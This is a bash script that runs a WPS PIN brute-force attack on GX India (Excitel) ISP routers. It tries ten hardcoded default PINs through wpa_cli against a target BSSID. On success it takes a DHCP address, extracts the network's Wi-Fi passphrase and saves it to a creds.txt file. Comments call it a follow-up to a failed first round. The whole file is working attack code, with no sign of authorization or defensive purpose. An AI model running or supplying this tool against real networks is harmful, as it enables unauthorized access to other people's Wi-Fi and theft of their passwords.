#!/bin/bash
# wps_try_ext.sh - extended WPS PIN round for GX India (Excitel) routers.
# Round 1 (14 generic defaults) already failed. This tries documented
# ISP-router defaults. Run as root. wlan0 untouched.
# Usage: ./wps_try_ext.sh <BSSID> <SSID> <outdir>
set -u
BSSID="${1:?bssid}"; SSID="${2:?ssid}"; OUT="${3:-./results-wps2}"
CTRL=/run/wpa_supplicant_pwn
IF=wlan1
mkdir -p "$OUT"
PINS="36601790 49804342 01472653 28339459 02763402 54985782 76229909 71531766 20172527 10000761"
echo "[*] WPS PIN sweep round 2 vs $SSID ($BSSID), $(echo $PINS | wc -w) PINs" | tee "$OUT/wps.log"

before_ids() { wpa_cli -p $CTRL -i $IF list_networks 2>/dev/null | tail -n +2 | cut -f1 | tr '\n' ' '; }
cleanup_new() { # remove networks added since $1
  for N in $(before_ids); do
    skip=0; for O in $1; do [ "$N" = "$O" ] && skip=1; done
    [ $skip -eq 0 ] && wpa_cli -p $CTRL -i $IF remove_network "$N" >/dev/null 2>&1
  done
  wpa_cli -p $CTRL -i $IF wps_cancel >/dev/null 2>&1
}
for PIN in $PINS; do
  OLD=$(before_ids)
  echo "[*] trying PIN $PIN ..." | tee -a "$OUT/wps.log"
  R=$(wpa_cli -p $CTRL -i $IF wps_pin "$BSSID" "$PIN" 2>&1)
  echo "    wps_pin -> $R" | tee -a "$OUT/wps.log"
  if echo "$R" | grep -qi fail; then echo "    (rejected locally, skipping)" | tee -a "$OUT/wps.log"; cleanup_new "$OLD"; continue; fi
  S=$(date +%s); DONE=0
  while [ $(( $(date +%s) - S )) -lt 25 ]; do
    ST=$(wpa_cli -p $CTRL -i $IF status 2>/dev/null | grep ^wpa_state=)
    echo "    $ST" >>"$OUT/wps.log"
    if [ "$ST" = "wpa_state=COMPLETED" ]; then DONE=1; break; fi
    sleep 2
  done
  if [ $DONE -eq 1 ]; then
    echo "[+] WPS SUCCESS PIN=$PIN" | tee -a "$OUT/wps.log"
    dhcpcd --timeout 8 $IF >/dev/null 2>&1; sleep 2
    IP=$(ip -4 -o addr show $IF 2>/dev/null | grep -oP 'inet \K\S+')
    NETID=$(wpa_cli -p $CTRL -i $IF list_networks 2>/dev/null | tail -1 | cut -f1)
    PSK=$(wpa_cli -p $CTRL -i $IF get_network "$NETID" psk 2>/dev/null)
    echo "$SSID:WPS-PIN-$PIN / PSK=$PSK / IP=$IP" | tee "$OUT/creds.txt"
    exit 0
  fi
  cleanup_new "$OLD"
  echo "[ ] PIN $PIN failed" | tee -a "$OUT/wps.log"
done
echo "[DONE] WPS round 2 finished, no hit. Further PIN guessing risks AP lockout - stopping." | tee -a "$OUT/wps.log"
exit 1
